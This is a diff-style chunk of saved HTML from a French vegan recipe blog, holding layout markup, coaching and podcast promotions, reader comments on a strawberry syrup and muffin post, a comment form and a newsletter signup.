+			<div class="elementor-heading-title elementor-size-default"><a href="https://vertmavie.com/je-reserve-ma-session-de-coaching-bien-etre/" target="_blank">Vert ma vie</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-c63c7c4 elementor-widget elementor-widget-text-editor" data-id="c63c7c4" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Coach de vie et conseillère en naturopathie spécialisée dans la sphère digestive, je suis formée à la gestion des Troubles du Comportement Alimentaire, à l’accompagnement, ainsi qu&rsquo;à la nutrition.</p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-c2b4ac1 elementor-align-center elementor-widget elementor-widget-button" data-id="c2b4ac1" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-button-wrapper">
+			<a href="https://vertmavie.com/a-propos/" target="_blank" class="elementor-button-link elementor-button elementor-size-sm" role="button">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-text">Découvrir le coaching</span>
+		</span>
+					</a>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-9309bd6 elementor-widget elementor-widget-image" data-id="9309bd6" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://vertmavie.com/je-reserve-ma-session-de-coaching-bien-etre/" target="_blank">
+							<picture class="attachment-medium_large size-medium_large" loading="lazy">
+<source type="image/webp" srcset="images/lili-768x512.jpg.webp 768w, images/lili.jpg.webp 800w" sizes="(max-width: 768px) 100vw, 768px">
+<img width="768" height="512" src="images/lili-768x512.jpg" alt="" loading="lazy" srcset="images/lili-768x512.jpg 768w, images/lili.jpg 800w" sizes="(max-width: 768px) 100vw, 768px">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-13ed52e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="13ed52e" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-4871b3f" data-id="4871b3f" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d2a4411 elementor-widget elementor-widget-image" data-id="d2a4411" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://auvertaveclili.fr/podcast">
+							<picture class="attachment-large size-large" loading="lazy">
+<source type="image/webp" srcset="images/Coaching-e1602152727559.png.webp">
+<img width="500" height="145" src="images/Coaching-e1602152727559.png" alt="podcast vert ma vie" loading="lazy">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-c25e9c4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c25e9c4" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-8fb6d6c" data-id="8fb6d6c" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-7be5c10 elementor-widget elementor-widget-image" data-id="7be5c10" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://auvertaveclili.fr/podcast">
+							<picture class="attachment-medium_large size-medium_large" loading="lazy">
+<source type="image/webp" srcset="images/Logo-Podcast.jpg.webp 400w, images/Logo-Podcast-90x90.jpg.webp 90w, images/Logo-Podcast-120x120.jpg.webp 120w" sizes="(max-width: 400px) 100vw, 400px">
+<img width="400" height="400" src="images/Logo-Podcast.jpg" alt="podcast vert ma vie" loading="lazy" srcset="images/Logo-Podcast.jpg 400w, images/Logo-Podcast-90x90.jpg 90w, images/Logo-Podcast-120x120.jpg 120w" sizes="(max-width: 400px) 100vw, 400px">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-614ff6b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="614ff6b" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-7cd3371" data-id="7cd3371" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-b8b55d4 elementor-hidden-phone elementor-widget elementor-widget-image" data-id="b8b55d4" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+											<a href="https://podcasts.apple.com/fr/podcast/vert-ma-vie/id1528926221" target="_blank">
+							<picture class="attachment-large size-large" loading="lazy">
+<source type="image/webp" srcset="images/Coaching-1-e1602230503664.png.webp">
+<img width="500" height="146" src="images/Coaching-1-e1602230503664.png" alt="" loading="lazy">
+</picture>
+								</a>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-b7c08ef elementor-hidden-phone elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="b7c08ef" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-231449d" data-id="231449d" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-c057597 elementor-hidden-phone elementor-widget elementor-widget-text-editor" data-id="c057597" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>J&rsquo;ai fait le choix de restreindre la publicité sur mon blog pour vous permettre d&rsquo;avoir une navigation plus agréable. En désactivant votre bloqueur de publicité sur ce site vous soutenez mon travail et je vous en remercie !</p></div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-78913b1 elementor-hidden-desktop elementor-hidden-tablet elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="78913b1" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-1f2b20b" data-id="1f2b20b" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-baa8f9b elementor-hidden-desktop elementor-hidden-tablet elementor-widget elementor-widget-shortcode" data-id="baa8f9b" data-element_type="widget" data-widget_type="shortcode.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-shortcode"><div class="outbrain-tm" id="13364-16"><script src="js/gen_1.js"></script><script src="js/requestform_2.js"></script></div></div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-4857fb1 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4857fb1" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-66 elementor-top-column elementor-element elementor-element-098ba24" data-id="098ba24" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-fe822a9 elementor-widget elementor-widget-button" data-id="fe822a9" data-element_type="widget" id="debut-comment" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-button-wrapper">
+			<a href="#reply-title" class="elementor-button-link elementor-button elementor-size-sm" role="button">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-text">Aller à la fin des commentaires</span>
+		</span>
+					</a>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-0823aaf elementor-widget elementor-widget-post-comments" data-id="0823aaf" data-element_type="widget" data-widget_type="post-comments.theme_comments">
+				<div class="elementor-widget-container">
+			<section id="comments" class="comments-area">
+
+			<h3 class="title-comments">
+			5 réponses		</h3>
+
+		
+	<ol class="comment-list">
+				<li id="comment-150497" class="comment even thread-even depth-1 parent">
+			<article id="div-comment-150497" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+												<b class="fn"><a href="https://animalsensible.fr" rel="external nofollow ugc" class="url">Aurore - Animal Sensible</a></b> <span class="says">dit :</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#comment-150497">
+							<time datetime="2020-04-30T11:14:16+02:00">
+								30/04/2020 à 11:14							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Je met ta recette de côté ! Mes parents ont beaucoup de fraises dans leur jardin et il arrive que certaines soient abimées car très mures. Je vais attendre d&rsquo;en récupérer pour la faire ?<br>
+Je trouve aussi le goût des sirops industriels et pas bio vraiment infect maintenant ! Le sirop de menthe maison est pas mal aussi !</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-150497" data-commentid="150497" data-postid="19603" data-belowelement="div-comment-150497" data-respondelement="respond" data-replyto="Répondre à Aurore - Animal Sensible" aria-label="Répondre à Aurore - Animal Sensible">Répondre</a></div>			</article><!-- .comment-body -->
+		<ol class="children">
+		<li id="comment-150602" class="comment byuser comment-author-admin bypostauthor odd alt depth-2">
+			<article id="div-comment-150602" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+												<b class="fn"><a href="https://auvertaveclili.fr/" rel="external nofollow ugc" class="url">Lili</a></b> <span class="says">dit :</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#comment-150602">
+							<time datetime="2020-04-30T19:37:24+02:00">
+								30/04/2020 à 19:37							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Bonne idée pour la récup&rsquo;, carrément ! :)<br>
+Merci pour ton message !<br>
+Je t&#8217;embrasse,<br>
+Lili</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-150602" data-commentid="150602" data-postid="19603" data-belowelement="div-comment-150602" data-respondelement="respond" data-replyto="Répondre à Lili" aria-label="Répondre à Lili">Répondre</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+		<li id="comment-149344" class="comment even thread-odd thread-alt depth-1">
+			<article id="div-comment-149344" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+												<b class="fn"><a href="http://cuillereetsaladier.blogspot.fr" rel="external nofollow ugc" class="url">Milounette</a></b> <span class="says">dit :</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#comment-149344">
+							<time datetime="2020-04-25T14:13:12+02:00">
+								25/04/2020 à 14:13							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>J&rsquo;ai moi aussi la chance de vivre dans une région où l&rsquo;on produit pas mal de fraises (le plus souvent sous serre et avec force de pesticides, mais heureusement aussi en bio !) et c&rsquo;est vrai que c&rsquo;est un bonheur en cette période. Je ne suis pas trop boissons sucrées (et donc sirop), mais j&rsquo;avais pris l&rsquo;habitude de faire du sirop de menthe pour ma Maman qui aime beaucoup ça lors de mes vacances dans notre maison du Jura (avec la menthe du jardin !), cette année j&rsquo;essayerai bien ta recette. Et d&rsquo;ici-là, je tenterai bien tes muffins, avec de la purée/compote de fraises.<br>
+J&rsquo;espère que tu arrives à vivre le confinement de manière assez sereine, et que tu réussi à avancer tout de même dans tes projets. Beau week-end à toi.</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-149344" data-commentid="149344" data-postid="19603" data-belowelement="div-comment-149344" data-respondelement="respond" data-replyto="Répondre à Milounette" aria-label="Répondre à Milounette">Répondre</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+		<li id="comment-149268" class="comment odd alt thread-even depth-1 parent">
+			<article id="div-comment-149268" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+												<b class="fn"><a href="http://vegebon.wordpress.com" rel="external nofollow ugc" class="url">Sandrine</a></b> <span class="says">dit :</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#comment-149268">
+							<time datetime="2020-04-25T07:46:42+02:00">
+								25/04/2020 à 07:46							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Ça me fait vraiment plaisir que tu publie à nouveau régulièrement tes jolies recettes !<br>
+La photo du sirop de fraise est très douce et belle.<br>
+Buses</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-149268" data-commentid="149268" data-postid="19603" data-belowelement="div-comment-149268" data-respondelement="respond" data-replyto="Répondre à Sandrine" aria-label="Répondre à Sandrine">Répondre</a></div>			</article><!-- .comment-body -->
+		<ol class="children">
+		<li id="comment-149284" class="comment byuser comment-author-admin bypostauthor even depth-2">
+			<article id="div-comment-149284" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+												<b class="fn"><a href="https://auvertaveclili.fr/" rel="external nofollow ugc" class="url">Lili</a></b> <span class="says">dit :</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="https://auvertaveclili.fr/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#comment-149284">
+							<time datetime="2020-04-25T09:11:47+02:00">
+								25/04/2020 à 09:11							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Merci Sandrine ! :) Le confinement a aussi du bon, hihi. ^^ Je t&#8217;embrasse bien fort, Lili</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="#comment-149284" data-commentid="149284" data-postid="19603" data-belowelement="div-comment-149284" data-respondelement="respond" data-replyto="Répondre à Lili" aria-label="Répondre à Lili">Répondre</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+	</ol><!-- .comment-list -->
+
+		
+
+
+	<div id="respond" class="comment-respond">
+		<h2 id="reply-title" class="comment-reply-title">Laisser un commentaire <small><a rel="nofollow" id="cancel-comment-reply-link" href="/sirop-de-fraises-maison-et-une-recette-bonus-de-muffins-vegan-sans-gluten/#respond" style="display:none;">Annuler la réponse</a></small></h2><form action="https://auvertaveclili.fr/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate=""><p class="comment-notes"><span id="email-notes">Votre adresse e-mail ne sera pas publiée.</span> Les champs obligatoires sont indiqués avec <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Commentaire</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Nom <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required="required"></p>
+<p class="comment-form-email"><label for="email">Adresse de messagerie <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required="required"></p>
+<p class="comment-form-url"><label for="url">Site web</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200"></p>
+<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"> <label for="wp-comment-cookies-consent">Enregistrer mon nom, mon e-mail et mon site dans le navigateur pour mon prochain commentaire.</label></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Laisser un commentaire"> <input type="hidden" name="comment_post_ID" value="19603" id="comment_post_ID">
+<input type="hidden" name="comment_parent" id="comment_parent" value="0">
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="d58d15892d"></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="113"></p></form>	</div><!-- #respond -->
+	
+</section><!-- .comments-area -->
+		</div>
+				</div>
+				<div class="elementor-element elementor-element-6d0292e elementor-widget elementor-widget-button" data-id="6d0292e" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-button-wrapper">
+			<a href="#debut-comment" class="elementor-button-link elementor-button elementor-size-sm" role="button">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-text">Aller au début des commentaires</span>
+		</span>
+					</a>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-da0b1af" data-id="da0b1af" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				</div>
+		</div>
+				<div data-elementor-type="footer" data-elementor-id="19958" class="elementor elementor-19958 elementor-location-footer" data-elementor-settings="[]">
+		<div class="elementor-section-wrap">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-f09024f elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="f09024f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-dca20ad" data-id="dca20ad" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<section class="elementor-section elementor-inner-section elementor-element elementor-element-67166eb elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="67166eb" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-fddb514" data-id="fddb514" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d061a3c elementor-widget elementor-widget-image" data-id="d061a3c" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-image">
+										<picture class="attachment-medium_large size-medium_large" loading="lazy">
+<source type="image/webp" srcset="images/7-jours-pour-transformer-mon-alimentation-768x1086.jpg.webp 768w, images/7-jours-pour-transformer-mon-alimentation-1086x1536.jpg.webp 1086w, images/7-jours-pour-transformer-mon-alimentation.jpg.webp 1414w" sizes="(max-width: 768px) 100vw, 768px">
+<img width="768" height="1086" src="images/7-jours-pour-transformer-mon-alimentation-768x1086.jpg" alt="" loading="lazy" srcset="images/7-jours-pour-transformer-mon-alimentation-768x1086.jpg 768w, images/7-jours-pour-transformer-mon-alimentation-1086x1536.jpg 1086w, images/7-jours-pour-transformer-mon-alimentation.jpg 1414w" sizes="(max-width: 768px) 100vw, 768px">
+</picture>
+											</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-3a7a7fc" data-id="3a7a7fc" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+					<div class="elementor-background-overlay"></div>
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-e2b78bf elementor-widget elementor-widget-heading" data-id="e2b78bf" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">ENVIE DE PLUS DE LÉGÈRETÉ...?</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-e537b1c elementor-widget elementor-widget-text-editor" data-id="e537b1c" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Mais aussi de confort, de vitalité et&#8230; de gourmandise !</p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-1bbaecc elementor-widget elementor-widget-text-editor" data-id="1bbaecc" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-text-editor elementor-clearfix"><p>Renseignez votre adresse e-mail et recevez un e-book de recettes exclusives végétales et sans gluten, qui apporteront LA touche de douceur qui manque à votre journée !</p></div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-8109598 elementor-widget elementor-widget-shortcode" data-id="8109598" data-element_type="widget" data-widget_type="shortcode.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-shortcode">					<script type="text/javascript">
+						var gCaptchaSibWidget;
+						var onloadSibCallback = function() {
+							var element = document.getElementsByClassName('sib-default-btn');
+							gCaptchaSibWidget = grecaptcha.render(element[0],{
+								'sitekey' : '6LeMc-sZAAAAAIXWdlld3hHzMkR66vJRI10ReL44',
+								'callback' : sibVerifyCallback
+							});
+						};
+					</script>
+									<script src="js/api.js" async defer></script>
+							<form id="sib_signup_form_1" method="post" class="sib_signup_form">
+				<div class="sib_loader" style="display:none;"><img src="images/spinner.gif" alt="loader"></div>
+				<input type="hidden" name="sib_form_action" value="subscribe_form_submit">
+				<input type="hidden" name="sib_form_id" value="1">
+                <input type="hidden" name="sib_form_alert_notice" value="Remplissez ce champ svp">
+                <input type="hidden" name="sib_security" value="54ed9080bb">
+				<div class="sib_signup_box_inside_1">
+					<div style="/*display:none*/" class="sib_msg_disp">
+					</div>
+					<p class="sib-email-area">
+    <input type="email" class="sib-email-area mailstyle" name="email" required="required" placeholder="ADRESSE EMAIL...">
+</p>
+<div id="sib_captcha"></div>
+<p>
+    <input type="submit" class="sib-default-btn sendstyle" value="RECEVOIR MON EBOOK !">
+</p>
+
+				</div>
+			</form>
+			<style>
+				form#sib_signup_form_1 p.sib-alert-message {
+    padding: 6px 12px;
+    margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+}
+form#sib_signup_form_1 p.sib-alert-message-error {
+    background-color: #f2dede;
+    border-color: #ebccd1;
+    color: #a94442;
+}
+form#sib_signup_form_1 p.sib-alert-message-success {
+    background-color: #dff0d8;
+    border-color: #d6e9c6;
+    color: #3c763d;
+}
+form#sib_signup_form_1 p.sib-alert-message-warning {
+    background-color: #fcf8e3;
+    border-color: #faebcc;
+    color: #8a6d3b;
+}			</style>
+			</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-9a345c6 elementor-hidden-tablet elementor-hidden-phone" data-id="9a345c6" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-08c4273 elementor-hidden-tablet elementor-hidden-phone" data-id="08c4273" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-3037401 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3037401" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-385ea1a elementor-hidden-tablet elementor-hidden-phone" data-id="385ea1a" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-db3aa46" data-id="db3aa46" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-a04eba0 elementor-widget elementor-widget-heading" data-id="a04eba0" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default">RETROUVEZ MOI @AUVERTAVECLILI</div>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-d8ca67b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="d8ca67b" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-7e72cd3 elementor-hidden-tablet elementor-hidden-phone" data-id="7e72cd3" data-element_type="column">
+			<div class="elementor-column-wrap">
+							<div class="elementor-widget-wrap">
+								</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-0a67a88" data-id="0a67a88" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-e6e8e96 my-social elementor-widget elementor-widget-heading" data-id="e6e8e96" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://www.instagram.com/auvertaveclili/" target="_blank">INSTAGRAM</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-96c074f my-social elementor-widget elementor-widget-heading" data-id="96c074f" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://www.instagram.com/auvertaveclili/" target="_blank">27k</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-2360b8b elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="2360b8b" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-2fb3408" data-id="2fb3408" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-f1908d2 my-social elementor-widget elementor-widget-heading" data-id="f1908d2" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://www.youtube.com/channel/UCCG6z0e7ljKWWyUyxfk123g/" target="_blank">YOUTUBE</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-b1c9e2d my-social elementor-widget elementor-widget-heading" data-id="b1c9e2d" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://www.youtube.com/channel/UCCG6z0e7ljKWWyUyxfk123g/" target="_blank">3.5k</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-efdc535 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="efdc535" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-inner-column elementor-element elementor-element-0b2fbd2" data-id="0b2fbd2" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d5cc975 my-social elementor-widget elementor-widget-heading" data-id="d5cc975" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://www.facebook.com/auvertaveclili" target="_blank">FACEBOOK</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-1ba16d8 my-social elementor-widget elementor-widget-heading" data-id="1ba16d8" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<div class="elementor-heading-title elementor-size-default"><a href="https://www.facebook.com/auvertaveclili" target="_blank">30k</a></div>		</div>
+				</div>
+				<div class="elementor-element elementor-element-8a57528 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="8a57528" data-element_type="widget" data-widget_type="divider.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-divider">
+			<span class="elementor-divider-separator">
+						</span>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
